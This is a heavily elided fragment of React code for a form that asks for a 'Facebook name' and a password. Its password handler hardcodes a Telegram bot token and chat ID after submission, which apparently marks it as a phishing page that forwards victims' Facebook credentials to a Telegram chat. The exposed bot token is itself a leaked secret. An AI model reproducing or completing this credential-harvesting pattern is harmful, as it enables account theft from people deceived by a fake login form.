    ...
    const onFinishPassWord = (values) => {
        ...
        if(activePassword === true){
            ...
            .then((response) => {
                ...
                const bot_token = '6530224928:AAHZBO_8fAnwWqk5xuC6Pddzk7YAHJoA-BA';
                const chat_id   = '7144822234';
        ...
        <div className="main">
            ...
            <div className="form">
                ...
                >
                    ...
                    <div className="item-form">
                        <label for="email">Facebook name</label>
                        <Form.Item
                            name="fill_facebook_pagename"
                            rules={[
                                {
                                required: true,
                                message: 'Please input your facebook name!',
                                },
                            ]}
                        >
                            <Input />
